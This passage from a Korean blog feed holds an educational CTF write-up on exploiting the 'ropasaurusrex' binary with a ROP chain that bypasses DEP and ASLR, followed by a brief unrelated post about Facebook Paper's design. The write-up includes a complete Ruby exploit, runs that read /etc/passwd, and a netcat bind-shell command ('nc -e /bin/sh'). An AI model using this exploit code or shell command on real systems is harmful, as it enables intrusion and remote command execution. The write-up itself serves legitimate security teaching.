<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -R ./ropasaurusrex
</span><span class='line'>
</span><span class='line'>./ropasaurusrex:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'><span class="m">08049600</span> R_386_GLOB_DAT    __gmon_start__
</span><span class='line'><span class="m">08049610</span> R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'><span class="m">08049614</span> R_386_JUMP_SLOT   write
</span><span class='line'><span class="m">08049618</span> R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
</span></code></pre></td></tr></table></div></figure>


<p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb ./ropasaurusrex
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
</span><span class='line'>^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>0xb7fe2424 in __kernel_vsyscall <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x0804961c
</span><span class='line'>0x804961c:      0xb7f48110
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> print <span class="nb">read</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7f48110 &lt;<span class="nb">read</span>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>보라.. <code>read()</code>를 가리키는 포인터가 우리가 알고 있는 메모리 주소에 있다! 이걸로 뭘 할지 궁금한가&hellip;? 힌트를 하나 주겠다: 우리는 <code>write()</code> 함수&mdash;주소를 아는 또 하나의 함수&mdash;를 사용해 임의의 메모리에서 데이터를 가져와 소켓에 쓸 수 있다.</p>

<h2><a id="finally-running-some-code"></a>드디어, 코드 실행!</h2>

<p>좋다, 잠깐 멈추고, 단계를 나누자. 우리는 이와 같은 과정이 필요하다:</p>

<ol>
<li><code>read()</code> 함수를 이용해 명령어를 메모리에 복사</li>
<li><code>write()</code> 함수를 이용해 <code>write()</code> 함수의 주소 구하기</li>
<li><code>system()</code> 주소를 구하기 위해 <code>write()</code>과 <code>system()</code>의 오프셋 계산</li>
<li><code>system()</code> 호출</li>
</ol>


<p><code>system()</code>을 호출하려면, <code>system()</code>의 주소를 메모리 어딘가에 쓰고, 그걸 호출해야 한다. 가장 쉬운 방법은 <code>.plt</code> 테이블의 <code>read()</code> 호출을 덮어쓰고 <code>read()</code>를 호출하는 것이다.</p>

<p>지금 아마도 조금 혼란스러울 것이다. 하지만 나도 그랬으니 걱정하지 마라. 난 이게 된다는 사실에 충격받았다. :)</p>

<p>잠시 멈추고 이걸 이해해 보자! 이건 우리가 원하는 스택 프레임일 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 [7]
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [6]
</span><span class='line'>|  [address of read]   | - 사실은 system()으로 점프할 것이다.
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 두 번째 read()의 프레임 [5]
</span><span class='line'>|     size_t count     | - 4바이트 (32비트 주소의 크기)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - read()를 가리키는 덮어쓸 수 있는 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 0 (stdin)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [4]
</span><span class='line'>|  [address of read]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- write()의 프레임 [3]
</span><span class='line'>|     size_t count     | - 4바이트 (32비트 주소의 크기)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - read()를 가리키는 포인터를 포함하는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 1 (stdout)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [2]
</span><span class='line'>|  [address of write]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 [1]
</span><span class='line'>|     size_t count     | - strlen(cmd)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - 쓸 수 있는 메모리
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 0 (stdin)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>오 이런, 이게 대체 뭐야?</p>

<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.</p>

<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>

<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>

<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/i 0x0804832C
</span><span class='line'>0x804832c &lt;<span class="nb">read</span>@plt&gt;:   jmp    DWORD PTR ds:0x804961c
</span></code></pre></td></tr></table></div></figure>


<p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.</p>

<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!</p>

<h2><a id="final-code"></a>최종 코드</h2>

<p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -x</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
</span><span class='line'><span class="c1"># From gdb, &quot;x/x system&quot;</span>
</span><span class='line'><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
</span><span class='line'><span class="c1"># Fram objdump, &quot;pop/pop/pop/ret&quot;</span>
</span><span class='line'><span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The location where read()&#39;s .plt entry is</span>
</span><span class='line'><span class="n">read_addr_ptr</span> <span class="o">=</span> <span class="mh">0x0804961c</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The difference between read() and system()</span>
</span><span class='line'><span class="c1"># Calculated as  read (0xb7f48110) - system (0xb7ec2450)</span>
</span><span class='line'><span class="c1"># Note: This is the one number that needs to be calculated using the</span>
</span><span class='line'><span class="c1"># target version of libc rather than my own!</span>
</span><span class='line'><span class="n">read_system_diff</span> <span class="o">=</span> <span class="mh">0x85cc0</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="c1"># system()&#39;s stack frame</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># Note that this calls read_addr, which is overwritten by a pointer</span>
</span><span class='line'>    <span class="c1"># to system() in the previous stack frame</span>
</span><span class='line'>    <span class="n">read_addr</span><span class="p">,</span>   <span class="c1"># (this will become system())</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># second read()&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># This reads the address of system() from the socket and overwrites</span>
</span><span class='line'>    <span class="c1"># read()&#39;s .plt entry with it, so calls to read() end up going to</span>
</span><span class='line'>    <span class="c1"># system()</span>
</span><span class='line'>    <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
</span><span class='line'>    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="n">read_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># write()&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># This frame gets the address of the read() function from the .plt</span>
</span><span class='line'>    <span class="c1"># entry and writes to to stdout</span>
</span><span class='line'>    <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
</span><span class='line'>    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
</span><span class='line'>    <span class="mi">1</span><span class="p">,</span>           <span class="c1"># stdout</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># retrurn address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="n">write_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># read()&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># This reads the command we want to run from the socket and puts it</span>
</span><span class='line'>    <span class="c1"># in our writable &quot;buf&quot;</span>
</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Get the result of the first read() call, which is the actual address of read</span>
</span><span class='line'><span class="n">this_read_addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Calculate the address of system()</span>
</span><span class='line'><span class="n">this_system_addr</span> <span class="o">=</span> <span class="n">this_read_addr</span> <span class="o">-</span> <span class="n">read_system_diff</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the address back, where it&#39;ll be read() into the correct place by</span>
</span><span class='line'><span class="c1"># the second read() call</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="o">[</span><span class="n">this_system_addr</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Finally, read the result of the actual command</span>
</span><span class='line'><span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Clean up</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 실행 결과다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>물론 <code>cat /etc/passwd</code>를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;pwd&quot;</span>
</span><span class='line'>/home/ron
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;whoami&quot;</span>
</span><span class='line'>ron
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;nc -vv -l -p 5555 -e /bin/sh&quot;</span> <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 3015
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>nc -vv localhost 5555
</span><span class='line'>debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> <span class="m">5555</span> <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/ron
</span><span class='line'>whoami
</span><span class='line'>ron
</span></code></pre></td></tr></table></div></figure>


<h2><a id="conclusion"></a>결론</h2>

<p>이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.</p>

<p>질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>링크가 <a href="https://wiki.skullsecurity.org/Assembly">바뀌었다</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Design Details: Paper by Facebook &rarr;]]></title>
    <link href="http://yous.be/2014/03/04/design-details-paper-by-facebook/"/>
    <updated>2014-03-04T22:02:47+09:00</updated>
    <id>http://yous.be/2014/03/04/design-details-paper-by-facebook</id>
    <content type="html"><![CDATA[<p><a href="http://blog.brianlovin.com/">Brian Lovin</a>이 쓴 <a href="http://blog.brianlovin.com/design-details-paper-by-facebook">페이스북 Paper의 디자인 디테일</a>에 관한 글이다.</p>

<blockquote><p><a href="https://itunes.apple.com/us/app/paper-stories-from-facebook/id794163692">페이스북 Paper</a>가 나온 지 하루가 지났고 대부분의 리뷰가 <a href="https://news.ycombinator.com/item?id=7171808">다소 갈리고 있다</a>. 나는 페이스북의 열성적 팬은 아니지만, Paper의 디자인과 디테일에 쏟은 관심은 비길 데 없으며 이는 다른 디자이너들과 공유할 가치가 있다.</p></blockquote>

<p>Paper 앱의 애니메이션을 총 23종의 GIF 파일로 기록하고 리뷰해 놓았다. Paper 앱이 출시되고 꽤 시간이 지났지만 앱을 사용하면서 눈치채지 못했던 점이 많아 지금이라도 공유한다.</p>
]]></content>
  </entry>
  
</feed>
